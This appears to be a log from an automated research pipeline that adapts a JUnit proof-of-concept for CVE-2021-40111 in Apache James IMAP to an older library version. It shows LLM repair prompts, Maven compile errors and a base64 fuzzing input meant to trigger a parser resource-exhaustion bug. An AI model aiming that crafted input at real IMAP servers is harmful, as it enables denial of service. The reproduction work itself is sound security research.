import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(request, command, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 42, Column: 14
  Message  : method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length
  Symbol   : None
  Location : None
  Code     : super.decode(request, command, session);
  Position : after the fixing line (15)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #1367 at iteration 0![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1843 (prompt), 1 (completion), 1844 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession
  reason: actual and formal argument lists differ in length
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.141 s
[INFO] Finished at: 2025-07-13T15:40:18Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 176 (prompt), 27 (completion), 203 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 38, 'column': 9, 'message': 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super(statusResponseFactory);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[LLMClient] Tokens used: 220 (prompt), 27 (completion), 247 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Related diffs for error: [(5746, 5.0), (5756, 5.0), (5761, 5.0), (5785, 5.0), (5812, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[RepairModule] Trying best diff #5746 with score 5.00[0m
[96m[RepairModule] Iteration 0, temperature 1.000: Trying diff #5746 with score 5.00[0m
[LLMClient] Tokens used: 1007 (prompt), 484 (completion), 1491 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super(statusResponseFactory);

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/test/java/org/apache/james/imap/message/response/UnpooledStatusResponseFactoryTest.java, Hunk: @@ -19,16 +19,24 @@

 package org.apache.james.imap.message.response;

+import org.apache.james.imap.api.message.response.AbstractTestForStatusResponseFactory;
-import org.apache.james.imap.api.ImapCommand;
-import org.apache.james.imap.api.message.response.AbstractStatusResponseFactoryTest;
 import org.apache.james.imap.api.message.response.StatusResponseFactory;
+import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
-import org.junit.jupiter.api.BeforeEach;

+public class UnpooledStatusResponseFactoryTest extends
+        AbstractTestForStatusResponseFactory {
-class UnpooledStatusResponseFactoryTest implements AbstractStatusResponseFactoryTest {
-
-    StatusResponseFactory factory;
-
-
-    @BeforeEach
-    void setUp() throws Exception {
-        factory = new UnpooledStatusResponseFactory();
-    }

     @Override
+    protected StatusResponseFactory createInstance() {
+        return new UnpooledStatusResponseFactory();
-    public StatusResponseFactory factory() {
-        return factory;
     }

 }

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(request, command, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(request, command, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length |'}
[92m[RepairModule] Error constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #5746 at iteration 0![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1615 (prompt), 1 (completion), 1616 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
